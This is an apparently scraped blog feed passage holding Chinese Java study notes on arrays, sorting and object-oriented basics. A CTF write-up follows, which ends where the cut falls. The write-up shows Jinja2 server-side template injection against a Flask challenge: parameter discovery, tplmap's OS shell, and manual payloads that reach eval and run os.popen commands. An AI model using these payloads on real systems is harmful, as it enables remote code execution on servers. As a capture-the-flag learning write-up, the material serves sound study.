scores = scores+arr[i];        &#125;        float ave = scores/5;        System.out.println(&quot;学生的总成绩是:&quot;+scores);        System.out.println(&quot;学生的平均成绩为:&quot;+ave);                for(int i = 0;i &lt; 5;i++)&#123;            System.out.println(&quot;第&quot;+(i+1)+&quot;个学生的成绩是&quot;+arr[i]);        &#125;    &#125;    &#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220222224720430.png" alt="image-20220222224720430"></p><h3 id="数组找最值"><a href="#数组找最值" class="headerlink" title="数组找最值"></a>数组找最值</h3><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220222232917032.png" alt="image-20220222232917032"></p><pre><code class="java">import java.util.*;class ArrayTest&#123;    public static void main(String [] args)&#123;        int [] arr = &#123;85,958,235,41,-85,69,74,666,854,9644&#125;;        int one = arr[0];        for(int i = 1;i &lt; 10;i++)&#123;            if(one &lt; arr[i])&#123;                one = arr[i];            &#125;else&#123;                continue;            &#125;        &#125;        System.out.println(&quot;找到了最大的钻石，它的克拉是&quot;+one);    &#125;    &#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220222232950262.png" alt="image-20220222232950262"></p><h2 id="冒泡排序"><a href="#冒泡排序" class="headerlink" title="冒泡排序"></a>冒泡排序</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220222233101791.png" alt="image-20220222233101791"></p><pre><code class="java">import java.util.*;class MaoPao&#123;    public static void main(String [] args)&#123;        int [] arr = &#123;85,958,235,41,-85,69,74,666,854,9644,856,884&#125;;        for(int ele :arr)&#123;            System.out.print(ele+&quot; &quot;);        &#125;        System.out.print(&quot;--&gt;&quot;);        int tmp = 0;        for(int j = 0;j&lt; (arr.length-1);j++)&#123;            for(int i = 0;i &lt; (arr.length-1);i++ )&#123;            if(arr[i] &gt; arr[i+1])&#123;                tmp = arr[i];                arr[i] = arr[i+1];                arr[i+1] = tmp;            &#125;else&#123;                continue;            &#125;        &#125;        &#125;        for(int ele :arr)&#123;            System.out.print(ele+&quot; &quot;);        &#125;    &#125;    &#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220223002739589.png" alt="image-20220223002739589"></p><p>优化:</p><p>1、专注于处理无序部分</p><pre><code class="java">for(int j = 0;j&lt; (arr.length-1-i);j++)&#123;</code></pre><p>2、解决无效排序</p><pre><code class="java">import java.util.*;class MaoPao&#123;    public static void main(String [] args)&#123;        int [] arr = &#123;85,958,235,41,-85,69,74,666,854,9644,856,884&#125;;        for(int ele :arr)&#123;            System.out.print(ele+&quot; &quot;);        &#125;        System.out.print(&quot;--&gt;&quot;);        int tmp = 0;        for(int j = 0;j&lt; (arr.length-1);j++)&#123;            boolean flag = true;            for(int i = 0;i &lt; (arr.length-1);i++ )&#123;            if(arr[i] &gt; arr[i+1])&#123;                tmp = arr[i];                arr[i] = arr[i+1];                arr[i+1] = tmp;                flag = false;            &#125;else&#123;                continue;            &#125;        &#125;        if(flag == true)            break;        &#125;        for(int ele :arr)&#123;            System.out.print(ele+&quot; &quot;);        &#125;    &#125;    &#125;</code></pre><h1 id="day6-数组"><a href="#day6-数组" class="headerlink" title="day6 数组"></a>day6 数组</h1><h2 id="查找指定元素的下标"><a href="#查找指定元素的下标" class="headerlink" title="查找指定元素的下标"></a>查找指定元素的下标</h2><pre><code class="java">import java.util.*;class MaoPao&#123;    public static void main(String [] args)&#123;        Scanner input = new Scanner(System.in);        System.out.println(&quot;请输入您要查找的元素:&quot;);        int a = input.nextInt();        int [] arr = &#123;85,958,235,41,-85,69,74,666,854,9644,856,884&#125;;        int index = 0;        for(int i = 0;i&lt;arr.length;i++)&#123;            if(a == arr[i])&#123;                index = i;                break;            &#125;else if(i == (arr.length-1))&#123;                System.out.println(&quot;查无此数&quot;);            &#125;        &#125;        System.out.println(&quot;该元素的下标为&quot;+index);    &#125;    &#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220224233730725.png" alt="image-20220224233730725"></p><h2 id="二维数组的声明"><a href="#二维数组的声明" class="headerlink" title="二维数组的声明"></a>二维数组的声明</h2><p>二维数组：存储一维数组的数组</p><pre><code class="java">int [][] arr; //推荐int arr[][];</code></pre><h2 id="二维数组的静态初始化"><a href="#二维数组的静态初始化" class="headerlink" title="二维数组的静态初始化"></a>二维数组的静态初始化</h2><pre><code class="java">int [][] arr = &#123;&#123;一维数组元素&#125;,&#123;一维数组元素&#125;,&#123;一维数组元素&#125;&#125;; //方式一double [][] doubleArr = new double[][]&#123;&#123;一维数组元素&#125;,&#123;一维数组元素&#125;,&#123;一维数组元素&#125;&#125;;//方式二</code></pre><h2 id="二维数组的动态初始化"><a href="#二维数组的动态初始化" class="headerlink" title="二维数组的动态初始化"></a>二维数组的动态初始化</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220224235726620.png" alt="image-20220224235726620"></p><pre><code class="java">int [][] arr = new int[5][5];</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220225000442619.png" alt="image-20220225000442619"></p><p>这种一维数组可以不等长</p><pre><code class="java">double [][] doubleArr = new double[3][];doubleArr[0] = new double[](3.14,6.28);</code></pre><h2 id="二维数组的遍历"><a href="#二维数组的遍历" class="headerlink" title="二维数组的遍历"></a>二维数组的遍历</h2><h3 id="普通for循环"><a href="#普通for循环" class="headerlink" title="普通for循环"></a>普通for循环</h3><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220225001512124.png" alt="image-20220225001512124"></p><h3 id="增强for循环"><a href="#增强for循环" class="headerlink" title="增强for循环"></a>增强for循环</h3><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220225002726883.png" alt="image-20220225002726883"></p><h2 id="二维数组内存图"><a href="#二维数组内存图" class="headerlink" title="二维数组内存图"></a>二维数组内存图</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220225224349397.png" alt="image-20220225224349397"></p><h2 id="二维数组练习"><a href="#二维数组练习" class="headerlink" title="二维数组练习"></a>二维数组练习</h2><pre><code class="java">122333444455555</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220225224754924.png" alt="image-20220225224754924"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220225224829329.png" alt="image-20220225224829329"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220225224959416.png" alt="image-20220225224959416"></p><h2 id="idea的使用"><a href="#idea的使用" class="headerlink" title="idea的使用"></a>idea的使用</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220225232922084.png" alt="image-20220225232922084"></p><pre><code class="windows">ctrl z 撤销ctrl y 取消撤销</code></pre><p>idea自带快捷键</p><pre><code class="java">以下写出来后+TABpsvm  写一个main方法        public static void main(String[] args) &#123;            &#125;sout  快速输出语句  System.out.println();shift + enter 快速跳到下一行CTRL D 快速删除CTRL ALT 下  快速复制ALT 上/下 快速移动代码CTRL SHIFT F 格式化代码CTRL /  快速单行注释CTRL shift / 快速多行注释</code></pre><h1 id="day7-面向对象"><a href="#day7-面向对象" class="headerlink" title="day7 面向对象"></a>day7 面向对象</h1><h2 id="面向对象思想概述"><a href="#面向对象思想概述" class="headerlink" title="面向对象思想概述"></a>面向对象思想概述</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220226000438684.png" alt="image-20220226000438684"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220226000448451.png" alt="image-20220226000448451"></p><h2 id="类和对象"><a href="#类和对象" class="headerlink" title="类和对象"></a>类和对象</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220226001405530.png" alt="image-20220226001405530"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220226001717468.png" alt="image-20220226001717468"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220226001904683.png" alt="image-20220226001904683"></p><h2 id="创建类和对象"><a href="#创建类和对象" class="headerlink" title="创建类和对象"></a>创建类和对象</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220226002820722.png" alt="image-20220226002820722"></p><h3 id="类的创建"><a href="#类的创建" class="headerlink" title="类的创建"></a>类的创建</h3><pre><code class="java">[权限修饰符] class 类名&#123;    &#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220226003024771.png" alt="image-20220226003024771"></p><h3 id="对象的创建"><a href="#对象的创建" class="headerlink" title="对象的创建"></a>对象的创建</h3><pre><code class="java">new 类名();</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220226010357542.png" alt="image-20220226010357542"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220226010407353.png" alt="image-20220226010407353"></p><h2 id="创建对象内存图"><a href="#创建对象内存图" class="headerlink" title="创建对象内存图"></a>创建对象内存图</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220226011045893.png" alt="image-20220226011045893"></p><h2 id="包名相关"><a href="#包名相关" class="headerlink" title="包名相关"></a>包名相关</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220226011739538.png" alt="image-20220226011739538"></p><p>包名一般采用公司网址的倒序</p><p>com.guigu.项目名</p><p> com.guigu.shopping.login</p><p>java.lang不需要导包</p><p>java.sql 数据库相关</p><p>java.io  IO流相关</p><p>java.net 网络编程相关</p><p>java.util 一些核心的工具类</p><p>ALT+ENTER 可以自动导包</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220228002520958.png" alt="image-20220228002520958"></p><h2 id="示例变量内存图"><a href="#示例变量内存图" class="headerlink" title="示例变量内存图"></a>示例变量内存图</h2><p>栈：存放局部变量  执行方法也会开辟空间  （存储时先进后出）</p><p>本地方法栈: 当执行native方法、c/c++ 存放局部变量、执行方法也会开辟空间</p><p>方法区: 类的信息、变量信息、方法信息、常量信息  …</p><p>堆：用来存放 对象数组等等 new出来的东西</p><p>程序计数器：用于存储下一条指令</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220228012112378.png" alt="image-20220228012112378"></p><h2 id="类变量-静态变量"><a href="#类变量-静态变量" class="headerlink" title="类变量(静态变量)"></a>类变量(静态变量)</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220228160600660.png" alt="image-20220228160600660"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220228162715834.png" alt="image-20220228162715834"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220228163846163.png" alt="image-20220228163846163"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220228164036100.png" alt="image-20220228164036100"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220228161831408.png" alt="image-20220228161831408"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220228162235053.png" alt="image-20220228162235053"></p><h2 id="成员变量练习"><a href="#成员变量练习" class="headerlink" title="成员变量练习"></a>成员变量练习</h2><h3 id="声明一个圆的图形类"><a href="#声明一个圆的图形类" class="headerlink" title="声明一个圆的图形类"></a>声明一个圆的图形类</h3><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220228164929259.png" alt="image-20220228164929259"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220228170140156.png" alt="image-20220228170140156"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220228170151620.png" alt="image-20220228170151620"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220228170202651.png" alt="image-20220228170202651"></p><h3 id="银行账号"><a href="#银行账号" class="headerlink" title="银行账号"></a>银行账号</h3><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220228170813217.png" alt="image-20220228170813217"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220228172650120.png" alt="image-20220228172650120"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220228180754684.png" alt="image-20220228180754684"></p><h3 id="两个类"><a href="#两个类" class="headerlink" title="两个类"></a>两个类</h3><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220228181325744.png" alt="image-20220228181325744"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/%5B%5DX%7D@5$I4%256U8%5B%5BX7%7B%25R8I.png" alt="img"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/R$7X6ZT$PCA5@F%EF%BF%BDAIJ28C.png" alt="img"></p><h2 id="成员变量练习内存图"><a href="#成员变量练习内存图" class="headerlink" title="成员变量练习内存图"></a>成员变量练习内存图</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220301003149544.png" alt="image-20220301003149544"></p><h2 id="方法的初识"><a href="#方法的初识" class="headerlink" title="方法的初识"></a>方法的初识</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220301003317796.png" alt="image-20220301003317796"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220301004501890.png" alt="image-20220301004501890"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220301004612778.png" alt="image-20220301004612778"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220301005234732.png" alt="image-20220301005234732"></p><h2 id="形参和实参"><a href="#形参和实参" class="headerlink" title="形参和实参"></a>形参和实参</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220301010731517.png" alt="image-20220301010731517"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220301010415100.png" alt="image-20220301010415100"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220301010426651.png" alt="image-20220301010426651"></p><h2 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220301011755061.png" alt="image-20220301011755061"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220301012111930.png" alt="image-20220301012111930"></p><h2 id="实例方法"><a href="#实例方法" class="headerlink" title="实例方法"></a>实例方法</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220301013731242.png" alt="image-20220301013731242"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220301013553565.png" alt="image-20220301013553565"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220301013625258.png" alt="image-20220301013625258"></p><h1 id="day8面向对象"><a href="#day8面向对象" class="headerlink" title="day8面向对象"></a>day8面向对象</h1><h2 id="基本类型值传递"><a href="#基本类型值传递" class="headerlink" title="基本类型值传递"></a>基本类型值传递</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220301221401587.png" alt="image-20220301221401587"></p><h2 id="引用数据类型传递"><a href="#引用数据类型传递" class="headerlink" title="引用数据类型传递"></a>引用数据类型传递</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220301222616500.png" alt="image-20220301222616500"></p><h2 id="数组内存图"><a href="#数组内存图" class="headerlink" title="数组内存图"></a>数组内存图</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220301223516746.png" alt="image-20220301223516746"></p><h2 id="局部变量"><a href="#局部变量" class="headerlink" title="局部变量"></a>局部变量</h2><p>定义到方法中的变量是局部变量，局部变量只在方法中有效</p><p>局部变量在使用前必须完成初始化，否则报错</p><p>定义到类中的变量是成员变量，成员变量只在类中有效</p><p>局部变量在方法调用后，才会进行初始化，当方法执行完毕就会随方法弹栈消失</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220301225248322.png" alt="image-20220301225248322"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220301225548707.png" alt="image-20220301225548707"></p><h2 id="可变形参"><a href="#可变形参" class="headerlink" title="可变形参"></a>可变形参</h2><p>参数的个数可以是任意个 0~n</p><p>如何声明？</p><pre><code class="java">public static void sum(int...a)&#123;&#125;  //三个点</code></pre><p>可变形参采用数组存储实参</p><pre><code class="java">xxxxxxxxxx public static void sum(double a , int...a)&#123;&#125; </code></pre><p>不能存在两个可变参数，且可变参数必须在最后</p><h2 id="方法重载"><a href="#方法重载" class="headerlink" title="方法重载"></a>方法重载</h2><p>不同的方法可以使用相同的方法名</p><p>要求：同一类中，同一方法名，不同的形参列表：数量、顺序、类型</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220302000931131.png" alt="image-20220302000931131"></p><p>方法调用时会根据不同的数据类型找到最佳匹配的方法</p><h2 id="命令行参数"><a href="#命令行参数" class="headerlink" title="命令行参数"></a>命令行参数</h2><p>idea</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220302003110469.png" alt="image-20220302003110469"></p><p>命令行</p><pre><code class="java">class Sakura&#123;    public static void main(String [] args)&#123;        for(String ele:args)&#123;            System.out.println(ele);        &#125;    &#125;&#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220302003703283.png" alt="image-20220302003703283"></p><h2 id="静态导入"><a href="#静态导入" class="headerlink" title="静态导入"></a>静态导入</h2><p>导入一个类中的所有静态资源</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220302004244597.png" alt="image-20220302004244597"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220302003831636.png" alt="image-20220302003831636"></p><h2 id="递归"><a href="#递归" class="headerlink" title="递归"></a>递归</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220302225312848.png" alt="image-20220302225312848"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220302235022144.png" alt="image-20220302235022144"></p><h2 id="对象类型数组"><a href="#对象类型数组" class="headerlink" title="对象类型数组"></a>对象类型数组</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220303001402384.png" alt="image-20220303001402384"></p><h2 id="封装的概念及四个权限修饰符的概念"><a href="#封装的概念及四个权限修饰符的概念" class="headerlink" title="封装的概念及四个权限修饰符的概念"></a>封装的概念及四个权限修饰符的概念</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220303215651821.png" alt="image-20220303215651821"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220303215810126.png" alt="image-20220303215810126"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220303220134500.png" alt="image-20220303220134500"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220303220910747.png" alt="image-20220303220910747"></p><h2 id="属性的简单封装"><a href="#属性的简单封装" class="headerlink" title="属性的简单封装"></a>属性的简单封装</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220303221632106.png" alt="image-20220303221632106"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220303221931211.png" alt="image-20220303221931211"></p><h1 id="day9面向对象"><a href="#day9面向对象" class="headerlink" title="day9面向对象"></a>day9面向对象</h1><h2 id="构造器"><a href="#构造器" class="headerlink" title="构造器"></a>构造器</h2><p>可以快速给成员变量赋值</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220303231205347.png" alt="image-20220303231205347"></p><p>创建类</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220303231339865.png" alt="image-20220303231339865"></p><p>构造</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220303231528049.png" alt="image-20220303231528049"></p><p>每一个类都会有一个无参构造器，但是当声明有参构造器后，默认无参构造器就会消失，这时候如果再写</p><pre><code class="java">Student s = new Student();</code></pre><p>就会报错。所以建议自定义类都再提供一个无参构造器。</p><p>使用构造器创建对象</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220303232035228.png" alt="image-20220303232035228"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220303233229581.png" alt="image-20220303233229581"></p><h2 id="对属性的封装"><a href="#对属性的封装" class="headerlink" title="对属性的封装"></a>对属性的封装</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220304004650481.png" alt="image-20220304004650481"></p><p>要对用户的信息进行校验</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220304005044933.png" alt="image-20220304005044933"></p><h2 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220304005720701.png" alt="image-20220304005720701"></p><pre><code class="java">//Staff.javapackage com.sakura.staff;public class Staff &#123;    private int num;    private char sex;    private double salary;    private String name;    public Staff(int a, String b, char c, double d)&#123;        this.num = a;        this.name = b;        this.sex = c;        this.salary = d;    &#125;    public Staff()&#123;&#125;    void setinfo(int a,String b,char c,double d)&#123;        this.num = a;        this.name = b;        this.sex = c;        this.salary = d;    &#125;    void getinfo()&#123;        System.out.println(&quot;num = &quot; + num);        System.out.println(&quot;name = &quot; + name);        System.out.println(&quot;sex = &quot; + sex);        System.out.println(&quot;salary = &quot; + salary);    &#125;&#125;</code></pre><pre><code class="java">//Test.javapackage com.sakura.staff;public class Test &#123;    public static void main(String[] args) &#123;        Staff num1 = new Staff();        num1.setinfo(123,&quot;sakura&quot;,&#39;男&#39;,20000);        num1.getinfo();        Staff num2 = new Staff(666,&quot;Alice&quot;,&#39;女&#39;,10000);        num2.getinfo();    &#125;&#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220304012001796.png" alt="image-20220304012001796"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;本篇文章更新java系列知识—持续更新中&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220211163044997.png&quot; alt=&quot;image-202202</summary>
      
    
    
    
    <category term="java" scheme="https://sakurahack-y.github.io/categories/java/"/>
    
    
    <category term="java" scheme="https://sakurahack-y.github.io/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>RootersCTF2019 I_&lt;3_Flask 0x70-0x7F</title>
    <link href="https://sakurahack-y.github.io/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/"/>
    <id>https://sakurahack-y.github.io/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/</id>
    <published>2022-02-11T02:24:11.000Z</published>
    <updated>2022-02-11T03:30:55.289Z</updated>
    
    <content type="html"><![CDATA[<h1 id="发现漏洞"><a href="#发现漏洞" class="headerlink" title="发现漏洞"></a>发现漏洞</h1><p>这道题是模板注入。</p><p><img src="/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/image-20220211102608147.png" alt="image-20220211102608147"></p><p>首先查看源代码，并没有什么用。</p><p><img src="/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/image-20220211102910418.png" alt="image-20220211102910418"></p><p>dirsearch爆破一下，什么也没有。</p><p><img src="/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/image-20220211102929099.png" alt="image-20220211102929099"></p><p>本题是flask类题目，ctf常考点不过就是模板注入，所以我们需要寻找可注入参数，本地并没有给出，需要我们自己去爆破。</p><p>我们这里采用arjun工具进行爆破。工具链接：<a href="https://github.com/s0md3v/Arjun">https://github.com/s0md3v/Arjun</a></p><p><img src="/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/image-20220211110028885.png" alt="image-20220211110028885">最终可爆破出来参数name。</p><p><img src="/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/image-20220211105238512.png" alt="image-20220211105238512"></p><p><img src="/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/image-20220211105250064.png" alt="image-20220211105250064"></p><p>测试了一下的确存在模板注入。</p><p>接下来就是对漏洞的利用。</p><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><h2 id="工具tplmap"><a href="#工具tplmap" class="headerlink" title="工具tplmap"></a>工具tplmap</h2><p><img src="/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/image-20220211110242684.png" alt="image-20220211110242684"></p><p><img src="/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/image-20220211110254561.png" alt="image-20220211110254561"></p><p>成功，发现为Jinja2模板，在ctf题目中经常考察</p><p>直接–os-shell拿下shell，读取flag</p><p><img src="/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/image-20220211110436293.png" alt="image-20220211110436293"></p><h2 id="手工利用"><a href="#手工利用" class="headerlink" title="手工利用"></a>手工利用</h2><p>只会工具当然不行，有时候工具无法成功，就需要自己手动测试，所以如何手撸也是需要掌握的。</p><p>具体可参考这篇文章，东西很多且杂，写给自己看的大佬别喷我。</p><p><a href="https://sakurahack-y.github.io/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/">https://sakurahack-y.github.io/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/</a></p><p>首先给几个比较通用的payload</p><pre><code>http://b8ef4c5f-f8bd-40de-acd4-c17dec6fb0d6.node4.buuoj.cn:81/?name=&#123;% for c in ().__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('whoami').read()") &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code></pre><p><img src="/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/image-20220211111654284.png" alt="image-20220211111654284"></p><pre><code>http://b8ef4c5f-f8bd-40de-acd4-c17dec6fb0d6.node4.buuoj.cn:81/?name=&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__ == 'catch_warnings' %&#125;  &#123;% for b in c.__init__.__globals__.values() %&#125;  &#123;% if b.__class__ == &#123;&#125;.__class__ %&#125;    &#123;% if 'eval' in b.keys() %&#125;      &#123;&#123; b['eval']('__import__("os").popen("whoami").read()') &#125;&#125;    &#123;% endif %&#125;  &#123;% endif %&#125;  &#123;% endfor %&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code></pre><p><img src="/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/image-20220211111724780.png" 